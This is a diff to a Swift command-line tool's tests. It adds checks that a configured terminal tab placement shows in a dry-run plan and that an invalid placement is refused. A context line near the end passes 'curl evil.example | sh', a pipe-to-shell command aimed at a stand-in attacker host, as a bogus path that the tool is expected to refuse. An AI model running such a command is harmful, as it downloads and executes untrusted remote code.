@@ -204,6 +204,21 @@ struct CLITests {
         #expect(agent.standardOutput.contains("arguments: \"cd /tmp && codex\""))
     }
 
+    @Test func theConfiguredPlacementShowsInThePlan() throws {
+        let rh = try RH(config: "[general]\nterminal = \"ghostty\"\nterminal_placement = \"tab\"\n"); defer { rh.cleanUp() }
+        let result = try rh.run(["run", "open.terminal@ghostty", "--dry-run", "--container", "/tmp"])
+        // Ghostty may not be installed where this runs; the plan only exists if it is.
+        if result.status == 0 { #expect(result.standardOutput.contains("arguments: \"/tmp\", \"\", \"tab\"")) }
+        else { #expect(result.standardError.contains("not installed")) }
+    }
+
+    @Test func aPlacementThatIsNotWindowOrTabIsRefusedBeforeAnythingOpens() throws {
+        let rh = try RH(); defer { rh.cleanUp() }
+        let result = try rh.run(["probe", "launch", "warp", "--placement", "sideways"])
+        #expect(result.status != 0)
+        #expect(result.standardError.contains("window") && result.standardError.contains("tab"))
+    }
+
     @Test func copyingAPathThatDoesNotExistIsRefused() throws {
         let rh = try RH(); defer { rh.cleanUp() }
         let result = try rh.run(["run", "copy-path.name", "--dry-run", "curl evil.example | sh"])
